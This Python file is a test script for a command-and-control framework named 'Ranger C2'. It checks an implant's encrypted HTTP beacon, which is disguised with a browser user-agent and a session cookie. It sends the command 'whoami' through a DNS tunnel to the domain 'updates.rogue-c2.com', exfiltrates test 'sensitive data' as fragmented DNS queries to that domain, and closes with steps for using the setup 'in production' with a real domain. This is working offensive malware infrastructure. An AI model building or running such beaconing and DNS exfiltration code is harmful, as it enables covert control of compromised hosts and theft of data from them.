#!/usr/bin/env python3
"""
Test DNS beacon functionality with Ranger C2
"""

import os
import sys
import json
import base64
import time
import hashlib
import requests
from cryptography.fernet import Fernet
from pathlib import Path

# Add current directory to path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(os.path.join(os.path.dirname(__file__), 'payloads'))

def test_http_beacon():
    """Test HTTP beacon (baseline)."""
    print("Testing HTTP beacon...")
    
    # Configuration
    C2_URL = "http://127.0.0.1:4444"
    IMPLANT_ID = "dns_test_123"
    
    # Generate session key
    key = Fernet.generate_key()
    f = Fernet(key)
    
    # Create beacon data
    beacon_data = {
        "implant_id": IMPLANT_ID,
        "timestamp": time.time(),
        "system_info": {
            "hostname": "dns-test-host",
            "platform": "linux",
            "user": "testuser"
        },
        "use_dns": True,  # Request DNS tunnel
        "dns_capable": True
    }
    
    # Encrypt
    encrypted = f.encrypt(json.dumps(beacon_data).encode())
    
    # Send handshake first
    handshake_data = {
        "implant_id": IMPLANT_ID,
        "implant_id_hash": hashlib.md5(IMPLANT_ID.encode()).hexdigest()[:8],
        "fingerprint": hashlib.sha256(b"dns_test_fingerprint").hexdigest()
    }
    
    try:
        # Handshake
        print("Sending handshake...")
        handshake_response = requests.post(
            f"{C2_URL}/handshake",
            json=handshake_data,
            timeout=10
        )
        
        if handshake_response.status_code == 200:
            print(f"✅ Handshake successful: {handshake_response.json()}")
            
            # Get session key from response
            response_data = handshake_response.json()
            if 'key' in response_data:
                session_key = response_data['key'].encode()
                print(f"Session key received: {session_key[:20]}...")
                
                # Update Fernet with received key
                f = Fernet(session_key)
                encrypted = f.encrypt(json.dumps(beacon_data).encode())
            else:
                print("❌ No session key in handshake response")
                return False
        else:
            print(f"❌ Handshake failed: {handshake_response.status_code}")
            return False
        
        # Send beacon
        print("Sending beacon...")
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Authorization': f'Bearer {IMPLANT_ID}',
            'Cookie': f'session={base64.b64encode(encrypted).decode()}'
        }
        
        beacon_response = requests.post(
            f"{C2_URL}/api/v1/telemetry",
            headers=headers,
            timeout=10
        )
        
        if beacon_response.status_code == 200:
            print(f"✅ Beacon successful: {beacon_response.json()}")
            
            # Check if DNS tunnel was acknowledged
            response_data = beacon_response.json()
            if 'dns_tunnel' in response_data and response_data['dns_tunnel']:
                print("✅ DNS tunnel enabled by C2")
            else:
                print("⚠️ DNS tunnel not enabled in response")
            
            return True
        else:
            print(f"❌ Beacon failed: {beacon_response.status_code}")
            print(f"Response: {beacon_response.text}")
            return False
            
    except Exception as e:
        print(f"❌ HTTP beacon test error: {e}")
        return False

def test_dns_tunnel_direct():
    """Test DNS tunnel directly."""
    print("\nTesting DNS tunnel directly...")
    
    try:
        from dnstunnel import DNSTunnel
        
        # Create DNS tunnel client
        tunnel = DNSTunnel(
            domain="updates.rogue-c2.com",
            mode="client",
            upstream_dns="127.0.0.1"  # Use local DNS if running
        )
        
        # Test sending command via DNS
        print("Sending command via DNS...")
        response = tunnel.send_command("whoami", use_fragmentation=True)
        
        if response and "fragmented and sent" in response:
            print(f"✅ DNS command sent: {response}")
            
            # Test receiving response (would need DNS server running)
            print("Note: To receive responses, DNS server needs to be running")
            print("Start DNS server with: python3 -c \"from payloads.dnstunnel import DNSTunnel; t = DNSTunnel(domain='updates.rogue-c2.com', mode='server'); t.start_server()\"")
            
            return True
        else:
            print(f"❌ DNS command failed: {response}")
            return False
            
    except Exception as e:
        print(f"❌ DNS tunnel test error: {e}")
        return False

def test_implant_dns_exfil():
    """Test implant DNS exfiltration."""
    print("\nTesting implant DNS exfiltration...")
    
    try:
        from dnstunnel import DNSFragmenter
        
        # Create fragmenter
        fragmenter = DNSFragmenter("updates.rogue-c2.com")
        
        # Test data
        test_data = {
            "type": "exfil",
            "data": "Sensitive data to exfiltrate via DNS",
            "timestamp": time.time(),
            "implant_id": "dns_test_123"
        }
        
        # Convert to bytes
        data_bytes = json.dumps(test_data).encode()
        
        print(f"Exfiltrating {len(data_bytes)} bytes via DNS...")
        
        # Send via DNS
        success = fragmenter.fragment_and_send(
            data_bytes,
            filename="exfil_test.json",
            session_id="test_session_123"
        )
        
        if success:
            print("✅ DNS exfiltration test passed")
            print(f"Data would be sent as DNS queries to: *.updates.rogue-c2.com")
            
            # Show what the queries would look like
            print("\nExample DNS query format:")
            print("  v{seq:04x}.{chunk}.{file_marker}.{session}.{domain}")
            print("  Example: v0000.ABCEF123.data.test_session_123.updates.rogue-c2.com")
            
            return True
        else:
            print("❌ DNS exfiltration test failed")
            return False
            
    except Exception as e:
        print(f"❌ Implant DNS exfil test error: {e}")
        return False

def check_dns_server():
    """Check if DNS server is running."""
    print("\nChecking DNS server status...")
    
    try:
        import socket
        
        # Try to connect to DNS port
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        
        # Try port 53 (standard DNS)
        try:
            sock.connect(('127.0.0.1', 53))
            print("✅ DNS server detected on port 53")
            return True
        except:
            pass
        
        # Try port 5353 (alternative)
        try:
            sock.connect(('127.0.0.1', 5353))
            print("✅ DNS server detected on port 5353")
            return True
        except:
            pass
        
        print("❌ No DNS server detected")
        print("Start DNS server with: ./start_dns_tunnel.sh")
        return False
        
    except Exception as e:
        print(f"❌ DNS server check error: {e}")
        return False

def main():
    """Main test function."""
    print("Ranger C2 DNS Tunneling Test")
    print("="*60)
    
    # Check if C2 is running
    print("Checking C2 server...")
    try:
        response = requests.get("http://127.0.0.1:4444", timeout=5)
        if response.status_code == 404:  # Flask 404 for root
            print("✅ C2 server is running")
        else:
            print(f"✅ C2 server responded: {response.status_code}")
    except:
        print("❌ C2 server not running")
        print("Start C2 with: python3 c2.py")
        return 1
    
    tests = [
        ("HTTP Beacon with DNS request", test_http_beacon),
        ("DNS Tunnel Direct", test_dns_tunnel_direct),
        ("Implant DNS Exfiltration", test_implant_dns_exfil),
        ("DNS Server Status", check_dns_server),
    ]
    
    print("\nRunning tests...")
    results = []
    
    for test_name, test_func in tests:
        print(f"\n{'='*40}")
        print(f"Test: {test_name}")
        print('='*40)
        
        try:
            if test_func():
                results.append((test_name, True))
                print(f"✅ {test_name} PASSED")
            else:
                results.append((test_name, False))
                print(f"❌ {test_name} FAILED")
        except Exception as e:
            results.append((test_name, False))
            print(f"❌ {test_name} ERROR: {e}")
    
    print("\n" + "="*60)
    print("Test Results Summary:")
    print("="*60)
    
    passed = 0
    for test_name, success in results:
        status = "✅ PASS" if success else "❌ FAIL"
        print(f"{status}: {test_name}")
        if success:
            passed += 1
    
    print(f"\nTotal: {passed}/{len(results)} tests passed")
    
    if passed == len(results):
        print("\n🎉 All DNS tunneling tests passed!")
        print("\nDNS tunneling is fully functional.")
        print("\nTo use in production:")
        print("1. Configure real domain with wildcard DNS")
        print("2. Update dns_config.json with your domain")
        print("3. Run: ./start_dns_tunnel.sh (as root for port 53)")
        print("4. Implants will automatically use DNS when available")
    else:
        print(f"\n⚠️ {len(results) - passed} tests failed")
        print("\nCheck the errors above.")
        print("Common issues:")
        print("- C2 server not running")
        print("- DNS server not started")
        print("- Domain configuration incorrect")
        print("- Firewall blocking DNS ports")
    
    return 0 if passed == len(results) else 1

if __name__ == "__main__":
    sys.exit(main())